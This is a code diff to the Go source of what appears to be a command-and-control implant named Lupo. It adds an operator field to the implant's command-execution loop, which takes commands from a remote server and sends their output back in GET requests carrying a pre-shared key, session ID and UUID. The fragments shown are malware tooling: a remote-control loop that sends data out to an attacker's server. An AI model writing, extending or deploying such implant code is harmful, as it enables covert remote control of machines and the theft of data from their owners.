@@ -32,7 +32,6 @@ type lupoImplant struct {
 var implant *lupoImplant
 
 var rootCert string = `some cert here
-
 `
 
 func main() {
@@ -155,6 +154,12 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 		}
 
 		unparsedCmd := serverResponse["cmd"].(string)
+		var operator string
+		if serverResponse["user"].(string) != "" {
+			operator = serverResponse["user"].(string)
+		} else {
+			operator = "server"
+		}
 
 		if unparsedCmd != "" {
 
@@ -197,7 +202,7 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 			}
 
 			// Return a response with our standard auth and include the data parameter with our command output to display in Lupo
-			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&data=" + dataString
+			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&user=" + operator + "&data=" + dataString
 			requestUrl = connectionString + requestParams
 
 			resp, err = client.Get(requestUrl)
